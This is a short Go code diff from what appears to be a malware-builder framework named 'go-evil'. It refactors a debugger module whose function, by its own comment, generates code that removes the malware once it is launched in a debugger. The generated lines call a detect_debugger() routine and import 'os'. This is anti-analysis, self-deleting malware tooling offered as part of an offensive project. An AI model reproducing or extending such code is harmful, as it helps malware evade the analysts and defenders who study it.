@@ -1,14 +1,13 @@
 package debugger
 
 import (
-	"github.com/TeamPhoneix/go-evil/utility/structure"
 	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
+	"github.com/TeamPhoneix/go-evil/utility/structure/json"
 )
 
 // Generates the code which will remove the malware
 // after it has been launched in a debugger
-func remove_behavior(s_json string) string {
-	data_object := structure.Receive(s_json)
+func remove_behavior(data_object *json.Json_t) {
 	body := []string{
 		"toReturn := false",
 		"toReturn = detect_debugger()",
@@ -23,5 +22,4 @@ func remove_behavior(s_json string) string {
 	data_object.Add_go_import("os")
 	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
 
-	return structure.Send(data_object)
 }
